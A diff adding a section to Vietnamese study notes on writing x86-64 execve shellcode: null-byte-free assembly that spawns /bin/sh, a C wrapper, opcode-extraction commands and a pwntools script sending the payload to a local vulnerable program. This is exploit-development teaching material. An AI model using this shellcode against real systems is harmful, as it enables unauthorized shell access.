@@ -183,3 +183,107 @@ int main() {
 * Tạo 1 tệp giả lập có chứ cờ để ktra xem shellcode có thành công hay ko : `echo '{Xin_chuc_mung_da_viet_thanh_cong!}' > /tmp/flag` . Vì shellcode của ta lập trình để đọc `/tmp/flag` nên phải có lệnh này để sau đó ta kiểm tra.
 * `./orw` khởi chạy tệp vừa biên dịch xem có ra là cờ mình vừa tạo ko để ktra shellcode
    
+`EXECVE SHELLCODE`
+-
+* Mục tiêu : trong system hacking thì chiếm được shell đồng nghĩa với việc kiểm soát toàn bộ hệ thống
+* System Call `execve()` : là 1 lời gọi hệ thống dùng để thực thi 1 chương trình , bản chất của nó là tiêu diệt bộ nhớ của tiến  trình hiện tại và thay thế nó bằng 1 tiến trình mới(ở đây là `/bin/sh`) nhưng sẽ vẫn giữ nguyên các quyền và cổng kết nối(file descriptors)
+* Để gọi thành công `execve("/bin/sh", NULL, NULL)`, ta phải thiết lập chính xác 4 thanh ghi sau trước khi gọi lệnh `syscall`:
+  - `rax` : với mã syscall là `0x3b`(tương đương số 59 trong hệ thập phân)
+  - `rdi` : đối số thứ nhất(filename) - con trỏ địa chỉ trỏ tới chuỗi `"/bin/sh\x00"`
+  - `rsi` : đối số thứ 2(`argv`) = `0`(NULL)
+  - `rdx` : đối số thứ 3(`envp`) = `0`(NULL)
+* Đoạn mã shellcode cơ bản sẽ như sau:
+```sh
+ ;Name: execve_basic.S
+ mov rax, 0x68732f6e69622f  ; hex của chuỗi "/bin/sh" theo little-endian
+ push rax                   ; đẩy chuỗi lên stack, push tự động thêm byte NULL(00) vào sau cho đủ 8 byte
+ mov rdi, rsp               ; rdi = địa chỉ của chuỗi "/bin/sh\x00"
+
+ xor rsi, rsi               ; rsi = 0
+ xor rdx, rdx               ; rdx = 0
+
+ mov rax, 0x3b              ; mã syscall của `execve`
+ syscall                    ; kích hoạt execve("/bin/sh", NULL, NULL)
+```
+- Nhưng với đoạn mã cơ bản này có 1 nhược điểm là việc mã máy sinh ra từ lệnh `mov rax, 0x3b` sẽ chứa byte NULL(`\00`). nếu như khi ta dùng đoạn mã này đi khai thác qua các hàm xử lý chuỗi(như `strcpy`,`gets`), shellcode sẽ bị đứt gãy và gây crash hệ thống
+* Đoạn mã shellcode thực chiến : được viết băng các thủ thuật assembly để ko sinh ra bất kì byte `00` nào trong mã máy.
+```sh
+  ; Khởi tạo argv và envp bằng 0 an toàn (xor không sinh ra byte NULL)
+    xor rsi, rsi                ; rsi = NULL
+    xor rdx, rdx                ; rdx = NULL
+
+ ; Đưa chuỗi vào Stack một cách hoàn hảo
+    mov rbx, 0x68732f2f6e69622f ; Đẩy chuỗi "/bin//sh" (8 bytes) thay vì "/bin/sh" (7 bytes)
+    push rbx                    ; Vừa khít thanh ghi 64-bit, loại bỏ hoàn toàn byte NULL thừa
+    mov rdi, rsp                ; rdi = địa chỉ của chuỗi "/bin//sh"
+
+ ; Cài đặt mã syscall an toàn (Thủ thuật Push/Pop)
+    push 0x3b                   ; Lệnh này mã máy chỉ là `6a 3b` (2 bytes, không có NULL)
+    pop rax                     ; Rút 0x3b từ Stack vào rax (Mã máy là `58`)
+
+   syscall                     
+```
+* Nhúng chương trình vào khung C :
+```sh
+     // Lưu tên file: shell.c
+     // Lệnh biên dịch: gcc -o shell shell.c -masm=intel
+
+  __asm__(
+    ".global run_sh\n"
+    "run_sh:\n"
+
+    "xor rsi, rsi \n"
+    "xor rdx, rdx \n"
+    "mov rbx, 0x68732f2f6e69622f \n"
+    "push rbx \n"
+    "mov rdi, rsp \n"
+    "push 0x3b \n"
+    "pop rax \n"
+    "syscall \n"
+    
+
+    // Syscall Exit (Thoát an toàn nếu execve thất bại)
+    "xor rdi, rdi \n"
+    "mov rax, 0x3c \n"
+    "syscall \n"
+  );
+
+  void run_sh();
+
+  int main() { 
+    run_sh(); 
+    return 0;
+   }
+```
+* Ta cần phải trích xuất mã máy (opcodes)
+  - Khi ta viết mã khai thác bằng python , ta ko thể nhét nguyên 1 đoạn code chứ assembly vào chương trình mục tiêu đc , vì máy tính chỉ hiểu mã máy(các byte thập lục phân)
+  - Có 4 bước chuẩn hóa như sau:
+    + Biên dịch thành Tệp đối tượng(object file) : `nasm -f elf64 execve.S` : Dịch từ file assemby sang file `.o`(Định dạng ELF64)
+    + Kiểm tra lại mã máy(disassemble): Dùng `objdump -d execve.o`
+    + Dùng `objcopy` để bóc tách phân vùng `.text` ra thành 1 file nhị phân thuần túy tên là `execve.bin` : `objcopy --dump-section .text=execve.bin execve.o`
+    + Định dạng thành chuỗi payload(formatting) : `xxd -p execve.bin | tr -d '\n' | sed 's/../\\x&/g'`
+      <img width="396" height="179" alt="image" src="https://github.com/user-attachments/assets/2273b1aa-b3ae-4b2d-8496-1a0b79d25ffe" />
+  - Tuy nhiên ta có thể sử dụng tính năng `asm()` tích hơp sẵn trong thư viện pwntools của python nó sẽ tự động làm cả 4 bước trên.
+    ```sh
+    from pwn import *
+
+     # Khai báo kiến trúc máy mục tiêu
+        context.arch = 'amd64'
+
+    # Pwntools tự động dịch Assembly sang chuỗi mã máy
+    shellcode = asm('''
+       xor rsi, rsi
+       xor rdx, rdx
+       mov rbx, 0x68732f2f6e69622f
+       push rbx
+       mov rdi, rsp
+       push 0x3b
+       pop rax
+       syscall
+    ''')
+
+    # Gửi thẳng vào chương trình mục tiêu
+     p = process('./chuong_trinh_loi')
+     p.sendline(shellcode)
+  ```
+
